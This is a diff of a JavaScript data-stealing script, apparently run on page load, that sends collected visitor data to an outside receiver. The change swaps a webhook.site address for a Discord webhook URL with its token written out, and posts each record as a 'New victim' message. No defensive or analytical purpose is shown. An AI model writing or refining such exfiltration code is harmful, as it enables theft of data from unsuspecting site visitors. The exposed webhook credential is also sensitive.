@@ -29,17 +29,25 @@ window.onload = function() {
 };
 
 // 3. SEND THE DATA TO YOUR RECEIVER
+// This is the CORRECT way to send data to a Discord webhook
 function sendData(data) {
-    // IMPORTANT: Replace 'YOUR_WEBHOOK_URL_HERE' with a real URL
-    // Get a free disposable URL from a service like webhook.site or bin.scr
-    const receiverURL = 'https://webhook.site/65609100-ad22-4c80-9000-da17c282f065';
+    // Your Discord Webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';
 
-    fetch(receiverURL, {
+    // Format the data into a string for the 'content' field
+    const messageContent = `New victim:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+
+    // Create the payload Discord expects
+    const payload = {
+        content: messageContent
+    };
+
+    // Send the request with the correct headers and body
+    fetch(webhookURL, {
         method: 'POST',
-        mode: 'no-cors', // 'no-cors' prevents the browser from showing errors, but it also means you won't know if it succeeded
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(data)
+        body: JSON.stringify(payload)
     });
 }
